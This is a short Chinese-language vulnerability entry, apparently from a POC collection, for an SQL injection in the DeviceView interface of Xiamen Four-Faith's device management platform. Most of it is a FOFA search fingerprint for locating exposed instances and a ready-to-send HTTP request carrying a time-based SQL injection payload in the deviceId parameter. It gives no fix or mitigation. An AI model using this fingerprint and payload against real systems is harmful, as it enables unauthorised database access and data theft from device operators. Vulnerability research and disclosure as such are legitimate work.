## 厦门四信设备管理平台 DeviceView SQL注入漏洞

## 漏洞描述
厦门四信通信科技有限公司设备管理平台 `DeviceView` 接口存在 SQL 注入漏洞，攻击者可操作数据库或获取敏感数据。

## 网络空间测绘
```
fofa: body="/Content/images/textpwd.png"
```

## POC
```
GET /Device/Device/DeviceView?deviceId=1';WAITFOR+DELAY+'0:0:5'--  HTTP/1.1
Host: [请补充实际域名]
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0
Accept: */*
Accept-Encoding: gzip, deflate
Connection: close
```

## 参考
- 社区情报

